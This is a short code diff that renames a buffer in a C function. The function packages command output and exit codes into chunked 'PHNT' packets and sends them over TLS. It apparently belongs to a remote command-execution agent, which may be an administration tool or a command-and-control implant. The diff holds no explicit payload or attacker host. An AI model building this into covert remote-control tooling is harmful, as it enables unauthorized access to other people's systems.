@@ -254,14 +254,14 @@ int ph_cmd_send_chunked(void *tls_ctx, const char *output, size_t output_len,
     DEBUG_LOG("[CHUNK] Sending %zu bytes in %u chunks (exit_code=%d)\n",
               output_len, total_chunks, exit_code);
 
-    uint8_t final_packet[4110];
+    uint8_t _packet[4110];
 
     uint16_t chunk_idx = 0;
     size_t offset = 0;
 
     while (offset < output_len || chunk_idx == 0) {
 
-        memset(final_packet, 0, sizeof(final_packet));
+        memset(_packet, 0, sizeof(_packet));
 
         size_t chunk_data_len = output_len - offset;
         if (chunk_data_len > PH_CMD_CHUNK_SIZE) {
@@ -278,34 +278,34 @@ int ph_cmd_send_chunked(void *tls_ctx, const char *output, size_t output_len,
         DEBUG_LOG("[CHUNK] #%u/%u: data_len=%zu, actual_len=%u, is_last=%d\n",
                   chunk_idx, total_chunks, chunk_data_len, actual_data_len, is_last_chunk);
 
-        final_packet[0] = 'P';
-        final_packet[1] = 'H';
-        final_packet[2] = 'N';
-        final_packet[3] = 'T';
-        final_packet[4] = opcode;
-        final_packet[5] = (chunk_idx >> 8) & 0xFF;
-        final_packet[6] = chunk_idx & 0xFF;
-        final_packet[7] = (total_chunks >> 8) & 0xFF;
-        final_packet[8] = total_chunks & 0xFF;
-        final_packet[9] = (actual_data_len >> 8) & 0xFF;
-        final_packet[10] = actual_data_len & 0xFF;
+        _packet[0] = 'P';
+        _packet[1] = 'H';
+        _packet[2] = 'N';
+        _packet[3] = 'T';
+        _packet[4] = opcode;
+        _packet[5] = (chunk_idx >> 8) & 0xFF;
+        _packet[6] = chunk_idx & 0xFF;
+        _packet[7] = (total_chunks >> 8) & 0xFF;
+        _packet[8] = total_chunks & 0xFF;
+        _packet[9] = (actual_data_len >> 8) & 0xFF;
+        _packet[10] = actual_data_len & 0xFF;
 
         if (chunk_data_len > 0) {
-            memcpy(&final_packet[11], output + offset, chunk_data_len);
+            memcpy(&_packet[11], output + offset, chunk_data_len);
         }
 
         if (is_last_chunk) {
-            final_packet[11 + chunk_data_len] = (uint8_t)(exit_code & 0xFF);
+            _packet[11 + chunk_data_len] = (uint8_t)(exit_code & 0xFF);
         }
 
         size_t packet_size = 11 + actual_data_len;
 
-        if (final_packet[0] != 'P' || final_packet[1] != 'H' ||
-            final_packet[2] != 'N' || final_packet[3] != 'T') {
+        if (_packet[0] != 'P' || _packet[1] != 'H' ||
+            _packet[2] != 'N' || _packet[3] != 'T') {
             return PH_ERR_INVALID_ARG;
         }
 
-        ssize_t sent = ph_tls_send(ctx, final_packet, packet_size);
+        ssize_t sent = ph_tls_send(ctx, _packet, packet_size);
         if (sent < 0 || (size_t)sent != packet_size) {
             DEBUG_LOG("[ERROR] Failed to send chunk #%u: sent=%zd, expected=%zu\n",
                       chunk_idx, sent, packet_size);
